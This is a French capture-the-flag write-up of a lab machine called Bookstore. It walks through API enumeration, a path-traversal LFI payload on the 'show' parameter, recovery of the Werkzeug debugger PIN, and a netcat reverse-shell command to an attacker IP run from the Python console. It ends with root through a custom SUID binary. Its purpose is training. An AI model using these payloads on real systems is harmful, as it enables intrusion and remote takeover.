Bookstore

LFIAPI REST WerkzeugPython RCESUID

Enumération d'une API REST non documentée, LFI sur le paramètre show, récupération du PIN Werkzeug via /proc/self/environ, shell via console Python, et escalade par binaire SUID custom analysé dans Ghidra.

Reconnaissance

bash 
nmap -sC -sV lab.thm
  • 22/tcp — SSH
  • 80/tcp — Apache (site Bookstore)
  • 5000/tcp — API Flask/Werkzeug

Enumération API REST

bash 
ffuf -u http://lab.thm:5000/api/v2/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api-endpoints.txt

Endpoints découverts : /api/v1/resources/books?show=1. Le paramètre show est vulnérable à une LFI.

LFI — /proc/self/environ

bash 
http://lab.thm:5000/api/v1/resources/books?show=../../../proc/self/environ
output 
...WERKZEUG_RUN_MAIN=true
SECRET_KEY=...
USERNAME=siddhant

On récupère les infos nécessaires pour calculer le PIN Werkzeug Debugger :

  • /proc/self/cgroup → machine-id
  • /proc/net/arp → adresse MAC
  • /proc/self/cmdline → chemin absolu du script Flask

Calcul du PIN Werkzeug

python3 
import hashlib, itertools
# Adapté depuis le code source Werkzeug
mac = '02:42:ac:11:00:02'   # depuis /proc/net/arp
machine_id = 'c9d3a69...'     # machine-id
username   = 'siddhant'
# ... calcul PIN

On accède au Werkzeug Debugger sur http://lab.thm:5000/console avec le PIN calculé.

RCE — Console Python Werkzeug

python3 — console Werkzeug
import os
os.popen('nc -e /bin/bash KALI_IP 9001').read()
User flag : dans /home/siddhant/user.txt

Escalade — SUID binaire custom

bash 
find / -perm -4000 -type f 2>/dev/null
/opt/mokshu

Analyse du binaire avec ltrace/strings :

bash 
ltrace /opt/mokshu
# → demande un nombre magique
# Code C décompilé (Ghidra) : valeur calculée par XOR double

# Python solver :
target = 0x5dcd21f4
magic  = (target & 0xffffffff) ^ 0x1116
print(magic)   # → fournir en input au binaire
Root flag : /root/root.txt

Leçons apprises

  • LFI sur une API peut avoir des conséquences critiques via /proc
  • Werkzeug en mode debug = console Python accessible → RCE garantie
  • gtfobins + Ghidra = binaires SUID custom → toujours les analyser
  • Ne jamais exposer Werkzeug debugger en production
